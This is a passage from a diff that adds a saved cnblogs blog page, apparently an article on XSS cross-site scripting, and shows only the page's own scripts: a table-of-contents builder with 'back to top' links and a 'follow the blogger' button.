+            var go_to_top = '<div style="text-align: right"><a href="#_labelTop">回到顶部</a><a name="_label' + i + '"></a></div>';
+            $(jquery_h3_list[i]).before(go_to_top);
+            var li_content = '<li><a href="#_label' + i + '">' + $(jquery_h3_list[i]).text() + '</a></li>';
+            content += li_content;
+        }
+        content    += '</ul>';
+        content    += '</div>';
+        if($('#cnblogs_post_body').length != 0 )
+        {
+            $($('#cnblogs_post_body')[0]).prepend(content);
+        }
+    }    
+}
+GenerateContentList();
+</script>
+
+<link href="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/a1.css" rel="stylesheet">
+
+
+<script type="text/javascript" language="javascript"> 
+//为右下角推荐推荐区域添加关注按钮
+window.onload = function () {
+    $('#div_digg').prepend('<div style="padding-bottom: 5px"><span class="icon_favorite" style="padding-top: 2px"></span><a onclick="cnblogs.UserManager.FollowBlogger(\'80358ebd-d530-e511-b908-9dcfd8948a71\');" href="javascript:void(0);" style="font-weight: bold; padding-left:5px;">关注一下楼主吧</a> </div>');
+}
+</script>
+    </div>
+
+<script type="text/javascript">getFollowStatus('80358ebd-d530-e511-b908-9dcfd8948a71');</script></body></html>
